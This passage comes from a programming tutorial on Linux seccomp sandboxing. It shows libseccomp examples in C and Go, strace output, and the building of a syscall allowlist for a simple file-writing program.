</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">prctl</span>(PR_SET_NO_NEW_PRIVS, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;prctl failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// Create a new seccomp filter context. 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ctx <span style="color:#f92672">=</span> <span style="color:#a6e22e">seccomp_init</span>(SCMP_ACT_KILL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (ctx <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;seccomp_init failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Add the syscalls that we want to allow to the seccomp filter context.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span style="color:#a6e22e">SCMP_SYS</span>(read), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;seccomp_rule_add failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span style="color:#a6e22e">SCMP_SYS</span>(exit_group), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;seccomp_rule_add failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Load the seccomp filter context.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">seccomp_load</span>(ctx) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;seccomp_load failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Read 4 bytes from the standard input.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Release the seccomp filter context.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">seccomp_release</span>(ctx);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The code above makes use of <code>libsecocmp</code> to set a seccomp filter. The code is much more readable and it is less error prone.
We just create a new seccomp filter context, we add the syscalls that we want to allow to the seccomp filter context and then we load the seccomp filter context. The <code>seccomp_load</code> function will set the seccomp filter and it will also release the seccomp filter context.</p>
<p>Notice the use of the macro <code>SCMP_SYS</code> to specify the syscall that we want to allow. This macro is used to avoid the use of the syscall number. The syscall number changes from architecture to architecture and it is not portable. The <code>SCMP_SYS</code> macro is used to specify the syscall name and the library will translate the syscall name to the syscall number.</p>
<p>In order to compile the previous example you need to link the program with the <code>libseccomp</code> library. The following command can be used to compile the previous example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o example_3 example_3.c -lseccomp
</span></span></code></pre></div><p>In order to understand better what our filter does, <code>libseccomp</code> provides use with some helper functions that can be used to print the seccomp filter. For example adding the following line of code to the previous example just after we add our rules. will print the filter in a human readable format:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">seccomp_export_pfc</span>(ctx, <span style="color:#ae81ff">1</span>);
</span></span></code></pre></div><p>The output of the previous example is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./example_3
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pseudo filter code start</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># filter for arch x86_64 (3221225534)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$arch <span style="color:#f92672">==</span> 3221225534<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># filter for syscall &#34;exit_group&#34; (231) [priority: 65535]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$syscall <span style="color:#f92672">==</span> 231<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    action ALLOW;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># filter for syscall &#34;read&#34; (0) [priority: 65535]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$syscall <span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    action ALLOW;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># default action</span>
</span></span><span style="display:flex;"><span>  action KILL;
</span></span><span style="display:flex;"><span><span style="color:#75715e"># invalid architecture action</span>
</span></span><span style="display:flex;"><span>action KILL;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pseudo filter code end</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span></code></pre></div><p>As you can see this functionality is very useful to understand what our filter does and could help us to debug our filter in order to understand why it is not working as expected.</p>
<h2 id="using-libseccomp-with-go">Using libseccomp with Go</h2>
<p>The <code>libseccomp</code> provides a nice for Go. First we’re going to write a simple program in Go that uses no <code>libseccomp</code>. Then we’ll try to understand which syscalls are used by this program. Finally we’ll write a new version of the program that uses the <code>libseccomp</code> library to deny all the syscalls that are not used by the program.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;os&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// create a new file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Create</span>(<span style="color:#e6db74">&#34;test.txt&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to create file: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// write to the file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Write</span>([]byte(<span style="color:#e6db74">&#34;hello world&#34;</span>)); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to write to file: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// close the file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Close</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to close file: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here we’ve a simple program which creates a file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># build the program</span>
</span></span><span style="display:flex;"><span>$ go build -o simple main.go
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># now we run the program attached to strace</span>
</span></span><span style="display:flex;"><span>$ strace -f -c ./simple
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>strace: Process <span style="color:#ae81ff">424724</span> attached
</span></span><span style="display:flex;"><span>strace: Process <span style="color:#ae81ff">424725</span> attached
</span></span><span style="display:flex;"><span>strace: Process <span style="color:#ae81ff">424726</span> attached
</span></span><span style="display:flex;"><span>strace: Process <span style="color:#ae81ff">424727</span> attached
</span></span><span style="display:flex;"><span>% time     seconds  usecs/call     calls    errors syscall
</span></span><span style="display:flex;"><span>------ ----------- ----------- --------- --------- ------------------
</span></span><span style="display:flex;"><span> 41.70    0.000460          <span style="color:#ae81ff">76</span>         <span style="color:#ae81ff">6</span>           nanosleep
</span></span><span style="display:flex;"><span> 28.38    0.000313          <span style="color:#ae81ff">31</span>        <span style="color:#ae81ff">10</span>         <span style="color:#ae81ff">2</span> futex
</span></span><span style="display:flex;"><span>  7.71    0.000085          <span style="color:#ae81ff">21</span>         <span style="color:#ae81ff">4</span>           clone
</span></span><span style="display:flex;"><span>  7.71    0.000085          <span style="color:#ae81ff">42</span>         <span style="color:#ae81ff">2</span>           openat
</span></span><span style="display:flex;"><span>  3.26    0.000036           <span style="color:#ae81ff">2</span>        <span style="color:#ae81ff">14</span>           rt_sigprocmask
</span></span><span style="display:flex;"><span>  3.26    0.000036           <span style="color:#ae81ff">4</span>         <span style="color:#ae81ff">9</span>           gettid
</span></span><span style="display:flex;"><span>  2.27    0.000025           <span style="color:#ae81ff">1</span>        <span style="color:#ae81ff">22</span>           mmap
</span></span><span style="display:flex;"><span>  2.18    0.000024           <span style="color:#ae81ff">2</span>        <span style="color:#ae81ff">10</span>           sigaltstack
</span></span><span style="display:flex;"><span>  1.18    0.000013          <span style="color:#ae81ff">13</span>         <span style="color:#ae81ff">1</span>           write
</span></span><span style="display:flex;"><span>  0.54    0.000006           <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">3</span>           fcntl
</span></span><span style="display:flex;"><span>  0.54    0.000006           <span style="color:#ae81ff">3</span>         <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">1</span> epoll_ctl
</span></span><span style="display:flex;"><span>  0.45    0.000005           <span style="color:#ae81ff">5</span>         <span style="color:#ae81ff">1</span>           pipe2
</span></span><span style="display:flex;"><span>  0.27    0.000003           <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">2</span>           close
</span></span><span style="display:flex;"><span>  0.27    0.000003           <span style="color:#ae81ff">3</span>         <span style="color:#ae81ff">1</span>           epoll_create1
</span></span><span style="display:flex;"><span>  0.18    0.000002           <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">1</span>           getrlimit
</span></span><span style="display:flex;"><span>  0.09    0.000001           <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">1</span>           setrlimit
</span></span><span style="display:flex;"><span>  0.00    0.000000           <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">1</span>           read
</span></span><span style="display:flex;"><span>  0.00    0.000000           <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">114</span>           rt_sigaction
</span></span><span style="display:flex;"><span>  0.00    0.000000           <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">1</span>           madvise
</span></span><span style="display:flex;"><span>  0.00    0.000000           <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">1</span>           execve
</span></span><span style="display:flex;"><span>  0.00    0.000000           <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">1</span>           arch_prctl
</span></span><span style="display:flex;"><span>  0.00    0.000000           <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">1</span>           sched_getaffinity
</span></span><span style="display:flex;"><span>------ ----------- ----------- --------- --------- ------------------
</span></span><span style="display:flex;"><span>100.00    0.001103           <span style="color:#ae81ff">5</span>       <span style="color:#ae81ff">208</span>         <span style="color:#ae81ff">3</span> total
</span></span></code></pre></div><p>As you can see the program uses a lot of syscalls.</p>
<p>Now let’s try to write a new version of the program that uses the libseccomp-golang library that has a deny all policy by default.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">seccomp</span> <span style="color:#e6db74">&#34;github.com/seccomp/libseccomp-golang&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// create a new filter which kills all the threads in the process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">filter</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">seccomp</span>.<span style="color:#a6e22e">NewFilter</span>(<span style="color:#a6e22e">seccomp</span>.<span style="color:#a6e22e">ActKillProcess</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to create filter: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">filter</span>.<span style="color:#a6e22e">Release</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// set the no new privs bit
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">filter</span>.<span style="color:#a6e22e">SetNoNewPrivsBit</span>(<span style="color:#66d9ef">true</span>) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to set no new privs bit: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">filter</span>.<span style="color:#a6e22e">Load</span>() <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to load filter: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// create a new file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Create</span>(<span style="color:#e6db74">&#34;test.txt&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to create file: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// write to the file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Write</span>([]byte(<span style="color:#e6db74">&#34;hello world&#34;</span>)); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to write to file: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// close the file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Close</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to close file: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Lets build the program and run it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./simple
</span></span><span style="display:flex;"><span>fish: Job 1, <span style="color:#e6db74">&#39;./simple&#39;</span> terminated by signal SIGSYS <span style="color:#f92672">(</span>Bad system call<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Ouch! The program has been killed by the kernel because it tried to use a syscall that is not allowed by the filter. Now let’s try to understand which syscall is not allowed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strace -f ./simple
</span></span><span style="display:flex;"><span>...snip...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426136<span style="color:#f92672">]</span> openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;test.txt&#34;</span>, O_RDWR|O_CREAT|O_TRUNC|O_CLOEXEC, <span style="color:#ae81ff">0666</span> &lt;unfinished ...&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426137<span style="color:#f92672">]</span> &lt;... nanosleep resumed&gt;NULL<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426137<span style="color:#f92672">]</span> nanosleep<span style="color:#f92672">({</span>tv_sec<span style="color:#f92672">=</span>0, tv_nsec<span style="color:#f92672">=</span>20000<span style="color:#f92672">}</span>,  &lt;unfinished ...&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426136<span style="color:#f92672">]</span> &lt;... openat resumed&gt;<span style="color:#f92672">)</span>      <span style="color:#f92672">=</span> <span style="color:#ae81ff">257</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426137<span style="color:#f92672">]</span> &lt;... nanosleep resumed&gt;NULL<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426140<span style="color:#f92672">]</span> &lt;... futex resumed&gt;<span style="color:#f92672">)</span>       <span style="color:#f92672">=</span> ?
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426138<span style="color:#f92672">]</span> &lt;... futex resumed&gt;<span style="color:#f92672">)</span>       <span style="color:#f92672">=</span> ?
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426141<span style="color:#f92672">]</span> &lt;... futex resumed&gt;<span style="color:#f92672">)</span>       <span style="color:#f92672">=</span> ?
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426140<span style="color:#f92672">]</span> +++ killed by SIGSYS <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span> +++
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426138<span style="color:#f92672">]</span> +++ killed by SIGSYS <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span> +++
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426141<span style="color:#f92672">]</span> +++ killed by SIGSYS <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span> +++
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426137<span style="color:#f92672">]</span> +++ killed by SIGSYS <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span> +++
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426139<span style="color:#f92672">]</span> &lt;... futex resumed&gt;<span style="color:#f92672">)</span>       <span style="color:#f92672">=</span> ?
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 426139<span style="color:#f92672">]</span> +++ killed by SIGSYS <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span> +++
</span></span><span style="display:flex;"><span>+++ killed by SIGSYS <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span> +++
</span></span><span style="display:flex;"><span>fish: Job 1, <span style="color:#e6db74">&#39;strace -f ./simple&#39;</span> terminated by signal SIGSYS <span style="color:#f92672">(</span>Bad system call<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>As we can see there’s quite few syscall that are not allowed by the filter. Now let’s try to add the syscalls that we need
to the filter from the first output where we <code>straced</code> the program without <code>seccomp</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">seccomp</span> <span style="color:#e6db74">&#34;github.com/seccomp/libseccomp-golang&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// string slice of syscall names
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">syscalls</span> = []<span style="color:#66d9ef">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;nanosleep&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;futex&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;clone&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;openat&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;rt_sigprocmask&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;gettid&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;mmap&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;sigaltstack&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;write&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;fcntl&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;epoll_ctl&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;pipe2&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;close&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;epoll_create1&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;getrlimit&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;setrlimit&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;read&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;rt_sigaction&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;madvise&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;execve&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;arch_prctl&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;sched_getaffinity&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// create a new filter which kills all the threads in the process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">filter</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">seccomp</span>.<span style="color:#a6e22e">NewFilter</span>(<span style="color:#a6e22e">seccomp</span>.<span style="color:#a6e22e">ActKillProcess</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to create filter: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">filter</span>.<span style="color:#a6e22e">Release</span>()
